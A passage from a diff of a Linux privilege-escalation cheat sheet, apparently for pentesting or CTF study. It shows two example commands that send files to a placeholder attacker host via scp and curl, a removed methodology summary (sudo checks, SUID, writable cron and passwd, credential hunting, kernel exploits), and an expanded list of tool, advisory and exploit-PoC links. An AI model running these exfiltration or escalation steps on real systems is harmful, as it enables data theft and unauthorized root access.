-scp file user@ATTACKER_IP:/path/
-curl -F "file=@file" http://ATTACKER_IP/upload
-```
-
----
-
-## Methodology Summary
-
-1. Run automated enumeration (LinPEAS, LinEnum)
-2. Check sudo permissions (`sudo -l`)
-3. Find SUID binaries and capabilities
-4. Search for writable files (cron jobs, services, /etc/passwd)
-5. Hunt for credentials (history, configs, environment)
-6. Check for kernel vulnerabilities (use as last resort)
-7. Reference GTFOBins for binary exploitation techniques
-
----
-
-## Resources
-
-- GTFOBins: https://gtfobins.github.io/
-- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
-- HackTricks: https://book.hacktricks.xyz/
-- Linux Kernel Exploits: https://github.com/SecWiki/linux-kernel-exploits
+- GTFOBins — https://gtfobins.github.io/
+- PEASS-ng (LinPEAS) — https://github.com/peass-ng/PEASS-ng
+- linux-smart-enumeration — https://github.com/diego-treitos/linux-smart-enumeration
+- linux-exploit-suggester — https://github.com/The-Z-Labs/linux-exploit-suggester
+- pspy — https://github.com/DominicBreuker/pspy
+- HackTricks – Linux Privilege Escalation — https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+- PayloadsAllTheThings – Linux Privilege Escalation — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+- Qualys – Looney Tunables (CVE-2023-4911) — https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
+- Qualys – CVE-2025-6018/6019 LPE chain — https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
+- CVE-2024-1086 (netfilter) PoC — https://github.com/Notselwyn/CVE-2024-1086
